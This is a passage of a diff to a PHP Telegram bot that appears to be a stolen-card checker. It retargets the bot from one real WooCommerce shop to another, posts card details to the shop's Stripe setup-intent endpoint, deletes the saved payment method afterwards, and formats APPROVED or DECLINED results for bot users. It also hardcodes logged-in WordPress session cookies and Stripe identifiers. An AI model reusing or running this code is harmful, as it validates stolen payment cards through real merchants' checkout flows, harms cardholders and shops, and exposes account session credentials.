sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf; __stripe_sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c',
+  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua-platform: "Android"',
-    'sec-ch-ua: "Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
-//    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryjQU0nO2GoQZEBYdk',
-    'accept-language: es-US,es;q=0.6',
-    'origin: https://healthyfungi.com.au',
-    'referer: https://healthyfungi.com.au/my-account/add-payment-method/',
+    'x-requested-with: XMLHttpRequest',
+    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+    'origin: https://www.thetravelinstitute.com',
+    'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
   ],
 ]);
+
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
 $json = json_decode($response, true);
-curl_close($curl);
-
-	
 //------------------------------------------//
 //$message = $json['data']['error']['message'];
 $message = str_replace("Error: ", "", $json['data']['error']['message']);
@@ -2962,28 +2935,32 @@ $success = $json['success'];
 $status = $json['data']['status'];
 curl_close($curl);
 
-	
 if ($success === true && $status === "succeeded") {
-    $respo = "3DS Authenticate Attempt Successful ✅";
+    $respo = "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅!";
+
+
 
 $curl = curl_init();
+
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://healthyfungi.com.au/my-account/payment-methods/',
+  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/payment-methods/',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf; __stripe_sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c',
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
-    'accept-language: es-US,es;q=0.6',
-    'sec-ch-ua: "Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua-platform: "Android"',
-    'referer: https://healthyfungi.com.au/my-account/add-payment-method/',
+    'referer: https://www.thetravelinstitute.com/my-account/add-payment-method/',
   ],
 ]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+curl_close($curl);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
@@ -2992,31 +2969,30 @@ preg_match($patron, $response, $coincidencias);
 $url_nonce = $coincidencias[0];
 curl_close($curl);
 
-
 echo "$url_nonce\n";
+
 
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://healthyfungi.com.au/my-account/delete-payment-method'.$url_nonce.'',
+  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/delete-payment-method'.$url_nonce.'',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-08%2019%3A36%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; wordpress_logged_in_febd530ada708d5093f883308bac36a7=rg2004j%7C1732304472%7CpblBuEHjl1mFZlV6P65yKlAcq4U25lj3NmtqOf78qrz%7C7cf3e7871efb13634e7094dac3694c8fbd343128b0365673a9e938aeebea5f7f; __stripe_mid=53e89807-84e5-4a98-a6e5-1f91e51883aa844aaf; __stripe_sid=cc06746a-e59e-4944-b9a9-35894a6b552d4eb28c; sbjs_session=pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhealthyfungi.com.au%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2022%3A08%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; mailchimp.cart.current_email=Dausitherer@cuvox.de; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1733004640%7CjNLKpX4cGcCWRTyAV9VhWYrkcDAsoRMd2WR7RBsbGze%7Ced04d655c45184593572d62e373fda864f4990e1661e7924e0a456cd68646307; __stripe_mid=aa379a42-e19a-4c90-9052-16328908a242d00773; __stripe_sid=8f88d6a3-78fb-4159-8d1d-179c9838144e9732ca; sbjs_session=pgs%3D12%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F',
   CURLOPT_HTTPHEADER => [
-    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
-    'sec-ch-ua: "Chromium";v="130", "Brave";v="130", "Not?A_Brand";v="99"',
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
     'sec-ch-ua-platform: "Android"',
-    'accept-language: es-US,es;q=0.6',
-    'referer: https://healthyfungi.com.au/my-account/payment-methods/',
+    'referer: https://www.thetravelinstitute.com/my-account/payment-methods/',
   ],
 ]);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
 curl_close($curl);
+
 
 } elseif ($success === true && $status === "requires_action") {
     $respo = "3DS Authenticate Rejected ❌";
@@ -3025,16 +3001,6 @@ curl_close($curl);
 }
 
 
-$timetakeen = (microtime(true) - $startTime);
-$time = substr_replace($timetakeen, '', 4);
-$proxy = "LIVE ✅";
-
-$bin = "<code>".$bin."</code>";
-$lista = "<code>".$lista."</code>";
-
-if (empty($respo)) {
-        $respo = $response;
-}
 
 $timetakeen = (microtime(true) - $startTime);
 $time = substr_replace($timetakeen, '', 4);
@@ -3043,29 +3009,27 @@ $proxy = "LIVE ✅";
 $bin = "<code>".$bin."</code>";
 $lista = "<code>".$lista."</code>";
 
+
+
+
 if (empty($respo)) {
         $respo = $response;
 }
 
-//sendPv($myid, $response);
-
-// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
 if (array_in_string($respo, $live_array)) {
-    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Braintree CCN_V3\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
     $live = True;
-} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false || strpos($respo, 'Pick up card - S') !== false) {
-    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Braintree CCN_V3\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
+} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
     $live = False;
 } else {
-    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Braintree CCN_V3\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
+    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Stripe Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
     $live = False;
 }
 
 if ($live) {
-//    echo "$respuesta\n";
     editMessage($chat_id, $respuesta, $id_text);
 } else {
-//    echo "$respuesta\n";
     editMessage($chat_id, $respuesta, $id_text);
 }
 
@@ -3073,7 +3037,6 @@ if ($live) {
 ob_flush();
 
 }
-
 
 
 elseif((strpos($message, "!ch") === 0)||(strpos($message, "/ch") === 0)||(strpos($message, ".ch") === 0)){
